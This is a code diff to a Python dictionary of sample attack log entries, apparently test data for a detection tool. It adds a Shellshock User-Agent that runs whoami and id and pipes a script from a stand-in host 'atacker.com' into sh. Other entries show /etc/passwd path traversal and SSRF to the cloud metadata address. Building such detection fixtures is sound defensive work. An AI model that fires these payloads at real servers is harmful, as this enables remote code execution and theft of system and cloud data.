@@ -26,9 +26,11 @@ PAYLOADS_ATAQUE = {
         "log": "GET /static/../../../../etc/passwd HTTP/1.1 - Host: security-target.com"
     },
     "5": {
-        "tipo": "Remote Code Execution (RCE)",
-        "log": "POST /cgi-bin/submit HTTP/1.1 - payload=() { :;}; echo; /usr/bin/whoami"
+        "tipo": "Remote Code Execution (RCE) - Shellshock",
+        # Incluimos metacaracteres claros (; |) y comandos en minúsculas (whoami, id, wget)
+        "log": "GET /cgi-bin/stats.cgi HTTP/1.1 - Host: vulnerable.com - User-Agent: () { :;}; /bin/bash -c 'whoami; id; wget http://atacker.com/malware.sh | sh'"
     },
+    # ... resto de payloads ...
     "6": {
         "tipo": "SSRF Attack",
         "log": "GET /fetch?url=http://169.254.169.254/latest/meta-data/local-ipv4 HTTP/1.1"
